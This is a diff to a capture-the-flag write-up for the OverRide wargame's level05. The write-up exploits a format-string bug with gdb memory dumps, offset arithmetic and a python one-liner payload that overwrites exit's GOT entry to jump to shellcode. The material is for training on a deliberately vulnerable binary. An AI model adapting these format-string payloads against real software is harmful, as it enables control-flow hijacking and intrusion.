@@ -62,10 +62,11 @@ lets debug the assembly
    
 buffer of size 100 stored at esp + 0x28
 ```
+```
 0x08048495 <+81>:	cmp    $0x40,%al
 
 0x080484a7 <+99>:	cmp    $0x5a,%al
-
+```
 The code checks if the character is less than or equal to 0x40, which corresponds to '@' in ASCII,
 and if it is greater than 0x5a, which corresponds to 'Z' in ASCII. If the character is within this range,
 the code jumps to the main+135 address, which indicates that the input is invalid.
@@ -89,14 +90,27 @@ python3 -c "print(65 ^ 32)"
 level05@OverRide:~$ (python -c 'print "AAAA" + "BBBB" " %10$p %11$p"') | ./level05
 aaaabbbb 0x61616161 0x62626262
 ```
+the addresses in the stack are as follows
+```
+(gdb) x/900 $esp
+0xffffd3c0
+0xffffd3d0
+0xffffd3e0
+```
+p 0xffffd3c0 = 4294955968
 
- ```
- shellAddr = 0xMsbLsb
+too long values, which results to negative value in signed 2's complement (-11328)
+
+so we need to split the value if we want to properly override exit.GOT 
+
+```
+shellAddr = 0xMsbLsb
  
 Lsb - 4 - 4 (already printed 2 addr)
 Msb - Lsb = 0xffff - Lsb
 
-ex
+exmpl:
+
 0xffffdc59
 
 (gdb) p 0xdc59 - 8 = 56401
@@ -104,24 +118,12 @@ ex
 ```
 
 ```
-
-(gdb)  x *((char**)environ)
-0xffffd647:	0x4c454853
-(gdb) p/x 0xffffd647 + 10
-$1 = 0xffffd651
-
-(gdb) p 0xd651 - 8      = 54857
-(gdb) p 0xffff - 0xd651 = 10670
-
-(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe0"[::-1] + "%54857%10$n%10670%11$n"' ; cat) | ./level05 > /dev/null
-Segmentation fault (core dumped)
-
 (gdb) x/900 $esp
 
 0xffffdd00:	0x90909090	0x90909090	0x90909090	0x90909090
 
 (gdb) p 0xdd00 - 8        = 56568
-(gdb)  p 0xffff - 0xdd00  = 8959
+(gdb) p 0xffff - 0xdd00   = 8959
 
 
 level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56568d%10$n%8959d%11$n"' ; cat) | ./level05 > /dev/null
